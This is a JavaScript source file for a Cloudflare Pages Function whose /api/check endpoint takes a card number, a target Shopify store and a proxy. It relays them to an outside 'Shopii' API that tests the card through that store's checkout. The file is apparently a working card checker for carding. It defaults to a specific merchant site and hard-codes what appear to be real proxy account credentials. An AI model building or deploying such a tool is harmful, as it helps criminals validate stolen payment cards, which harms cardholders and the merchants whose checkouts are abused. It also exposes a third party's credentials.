// Cloudflare Pages Function - API Check Endpoint
// Handles /api/check requests

export const onRequest = async (context) => {
    const { request } = context;
    const url = new URL(request.url);

    // CORS headers
    const corsHeaders = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
        'Access-Control-Allow-Headers': '*',
        'Content-Type': 'application/json'
    };

    // Handle preflight
    if (request.method === 'OPTIONS') {
        return new Response(null, { status: 204, headers: corsHeaders });
    }

    // Only handle /api/check
    if (url.pathname !== '/api/check') {
        return new Response(JSON.stringify({ error: 'Not Found' }), { 
            status: 404,
            headers: { ...corsHeaders }
        });
    }

    try {
        const site = url.searchParams.get('site');
        const cc = url.searchParams.get('cc');
        const proxy = url.searchParams.get('proxy');

        // Validate required params
        if (!cc) {
            return new Response(JSON.stringify({ 
                error: 'Missing cc parameter',
                Status: 'Error',
                Response: 'MISSING_CC'
            }), { 
                status: 400,
                headers: corsHeaders
            });
        }

        // Default values
        const targetSite = site || 'https://artpop.com';
        const proxyStr = proxy || 'px014236.pointtoserver.com:10780:purevpn0s11127688:4mwmyaoa';

        console.log(`[API] Checking card: ${cc.substring(0, 8)}... on ${targetSite}`);

        // Call Shopii API
        const shopiiUrl = `https://shopii-api-production.up.railway.app/shopify?site=${encodeURIComponent(targetSite)}&cc=${encodeURIComponent(cc)}&proxy=${encodeURIComponent(proxyStr)}`;
        
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 35000); // 35 second timeout

        const response = await fetch(shopiiUrl, {
            method: 'GET',
            headers: {
                'Accept': 'application/json',
                'User-Agent': 'ShopiiPro/2.0'
            },
            signal: controller.signal
        });

        clearTimeout(timeoutId);

        if (!response.ok) {
            throw new Error(`Shopii API returned ${response.status}`);
        }

        const data = await response.json();
        
        console.log(`[API] Result for ${cc.substring(0,8)}...: ${data.Status} - ${data.Response}`);

        return new Response(JSON.stringify(data), {
            status: 200,
            headers: corsHeaders
        });

    } catch (error) {
        console.error('[API] Error:', error.message);
        
        let errorMessage = error.message;
        let responseCode = 'API_ERROR';
        
        if (error.name === 'AbortError') {
            errorMessage = 'Request timeout';
            responseCode = 'TIMEOUT';
        }

        return new Response(JSON.stringify({
            error: true,
            message: errorMessage,
            Status: 'Error',
            Response: responseCode,
            Currency: null,
            Gateway: null,
            Price: null,
            RawResponse: errorMessage
        }), {
            status: 500,
            headers: corsHeaders
        });
    }
};
